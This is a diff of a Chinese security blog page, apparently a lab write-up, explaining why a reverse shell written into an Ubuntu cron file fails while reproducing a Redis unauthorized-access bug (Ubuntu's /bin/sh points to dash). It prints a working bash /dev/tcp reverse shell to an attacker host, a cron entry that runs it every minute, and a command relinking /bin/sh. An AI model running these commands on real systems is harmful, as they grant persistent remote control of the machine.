@@ -104,7 +104,7 @@
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/hDGaFg6CFG.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/fB8kK61H0B.png?imageslim">
 <meta property="og:image" content="http://p008biu9n.bkt.clouddn.com/blog/180818/cfi3KGBI0d.png?imageslim">
-<meta property="og:updated_time" content="2018-08-18T10:20:33.707Z">
+<meta property="og:updated_time" content="2018-08-18T13:56:47.915Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="解决ubuntu任务计划写shell失败的问题">
 <meta name="twitter:description" content="解决ubuntu任务计划写shell失败的问题这个问题的由来是因为自己在复现redis未授权访问漏洞时，通过向linux任务计划文件里写反弹shell的命令时，发现shell并不能反弹回来，之前使用的server端为Centos，一切顺利并没有出现这种问题，结果这次server换成了ubuntu，就出现不能反弹的问题，结果因为这个问题卡了很久，最终在kakaxi和ttgo2两位大佬的指导和帮助下才">
@@ -379,19 +379,20 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls -al /bin/sh</div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/mBK26LkHI7.png?imageslim" alt="mark"><br><strong>可以看到<code>/bin/sh</code>其实是一个软连接文件(l),类似于windows中的快捷方式，只不过在ubuntu中，<code>/bin/sh</code>这个软连接指向了<code>dash</code>，而我们反弹shell使用的shell环境是<code>bash</code>，所以这一点是反弹出错的根本原因</strong></p>
 <p><strong>那么之前的centos为什么就能成功，下面来看一下centos里面的<code>/bin/sh</code>的指向</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/D6b21a44ml.png?imageslim" alt="mark"><br><strong>可以看到centos中<code>/bin/sh</code>的指向是bash，所以命令执行不会出错</strong></p>
+<p><strong>在这里说一下bash和dash的区别，bash是具有交互能力的shell，而dash不具有交互能力，只是具有运行脚本的能力的shell</strong></p>
 <p><strong>搞清楚了根本的原因后，来说一下解决的办法，这里有两种解决办法，其中一种解决办法是通过修改ubuntu中<code>/bin/sh</code>的指向，将dash改为bash即可，命令如下</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s -f bash /bin/sh</div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cGhdh4gbmF.png?imageslim" alt="mark"><br><strong>可以看到此时<code>/bin/sh</code>以及指向了<code>bash</code>，此时将任务计划里的文件修改为之前反弹shell的命令，可以看到不会再报错了，并且shell成功反弹到了kali上</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/Jhm2mgDdhi.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cChIDHhm8m.png?imageslim" alt="mark"></p>
 <p><strong>下面来说一下第二种解决办法，首先我们先将<code>/bin/sh</code>的指向改回<code>dash</code></strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ln -s -f dash /bin/sh</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/6kcc9EHIEj.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/Kcal0c0Be3.png?imageslim" alt="mark"><br><strong>下面来说一下第二种方法，就是避免在cron文件里去使用bash这个shell，我们可以另外的去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用这个shell脚本文件</strong></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/6kcc9EHIEj.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/Kcal0c0Be3.png?imageslim" alt="mark"><br><strong>下面来说一下第二种方法，就是避免在cron文件里去使用bash这个具有交互能力的shell，我们可以另外的去建一个反弹shell的shell脚本文件，然后在任务计划里面去直接调用运行这个shell脚本文件即可</strong></p>
 <p><strong>shell脚本文件如下，文件名为<code>/tmp/test.sh</code></strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.107/7777 0&gt;&amp;1</div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/HHkFmi68jB.png?imageslim" alt="mark"><br><strong>然后为test.sh加上执行权限</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x /tmp/test.sh</div></pre></td></tr></table></figure>
 <p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/hDGaFg6CFG.png?imageslim" alt="mark"><br><strong>之后任务计划里的内容修改为</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * /tmp/test.sh</div></pre></td></tr></table></figure>
-<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/fB8kK61H0B.png?imageslim" alt="mark"><br><strong>可以看到kali上成功反弹到了shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cfi3KGBI0d.png?imageslim" alt="mark"></p>
+<p><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/fB8kK61H0B.png?imageslim" alt="mark"><br><strong>由于现在cron的shell环境为dash，所以具有可以直接运行<code>/tmp/test.sh</code>这个脚本文件的能力，所以执行了test.sh里面这条反弹shell的命令，现在便可以看到kali上成功反弹到了shell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180818/cfi3KGBI0d.png?imageslim" alt="mark"></p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>这一次真的是踩了很多坑，最终才终于弄明白，通过这次的学习使我对linux的认识更加的深刻了，同时也学到了解决问题的思路和方法，在这里十分感谢kakaxi和ttgo2两位大神的帮助！</strong></p>
 <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><strong><a href="https://www.365yg.com/i6590668394092036612#mid=1568076190183425" target="_blank" rel="external">视频详解（来自kakaxi和ttgo2两位师傅）</a></strong></p>
 
@@ -433,6 +434,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/08/18/2018-08-18/" rel="prev" title="关于ubuntu和centos cron的一些区别">
+                关于ubuntu和centos cron的一些区别 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -513,7 +518,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">43</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
